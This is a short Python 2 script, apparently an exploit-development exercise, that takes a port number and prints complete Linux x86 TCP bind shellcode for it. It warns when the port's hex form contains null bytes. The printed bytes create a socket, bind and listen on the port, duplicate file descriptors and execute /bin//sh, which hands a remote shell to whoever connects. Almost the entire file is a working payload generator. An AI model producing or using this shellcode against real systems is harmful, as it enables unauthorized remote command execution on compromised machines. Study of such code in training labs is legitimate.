#!/usr/bin/python

import random
import argparse
import sys
import struct

parser = argparse.ArgumentParser()
parser.add_argument("-p","--port", help="Please provide an interger between 1 and 65535", type=int, required=True)
args = parser.parse_args()

port = args.port

if port < 1 or port > 65535:
	print "Please pick a valid port number between 1 and 65535"
	sys.exit()
elif port > 0 and port < 1024:
	print "You will need to be root to bind to a lower port"


#convert the decimal value of the port to hex
hex_port = struct.pack('<L',port).encode('hex')[:4]

if str(hex_port)[:2] == "00" or str(hex_port)[2:4] == "00":
	print "Notice that you have the port number you put might not able to work perfectly , try to change other port number tq , because we detected there's '\x00' when we generate according the port given "

print "Generating TCP bind shellcode for port " + str(port) + "\nThe hex for the port is " + str(hex_port)[2:4]+str(hex_port)[:2]
print "Your shellcode is:"
print "\"\\x31\\xc0\\xb0\\x66\\x31\\xd2\\x52\\x42\\x52\\x31\\xdb\\x43\\x42\\x52\\x89\\xe1\\xcd\\x80\\x96\\x43\\x31\\xd2\\x52\\x66\\x68\\x" + str(hex_port)[2:4] + "\\x" + str(hex_port)[:2] + "\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\\x56\\x89\\xe1\\x31\\xc0\\xb0\\x66\\xcd\\x80\\x31\\xc0\\xb0\\x66\\x53\\x43\\x43\\x56\\x89\\xe1\\xcd\\x80\\x31\\xd2\\x52\\x52\\x56\\x89\\xe1\\x43\\x31\\xc0\\xb0\\x66\\xcd\\x80\\x31\\xc9\\x89\\xc3\\x31\\xc0\\xb0\\x3f\\xcd\\x80\\x41\\x83\\xf9\\x04\\x75\\xf4\\x31\\xc0\\xb0\\x0b\\x31\\xd2\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xd1\\xcd\\x80\""
